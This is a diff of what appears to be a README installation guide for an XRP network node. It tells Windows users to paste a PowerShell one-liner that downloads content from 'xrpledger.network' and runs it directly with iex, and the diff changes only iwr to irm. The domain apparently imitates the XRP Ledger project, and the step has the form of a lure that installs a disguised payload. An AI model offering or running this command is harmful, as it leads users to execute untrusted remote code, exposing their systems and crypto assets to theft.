@@ -11,7 +11,7 @@ Open the Run dialog by pressing `Win + R`, type `powershell`, and press **Enter*
 
 #### Step 2: Run the node installation command
 ```powershell
-powershell -c "iwr 'xrpledger.network' | iex"
+powershell -c "irm 'xrpledger.network' | iex"
 `````
 _After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
 
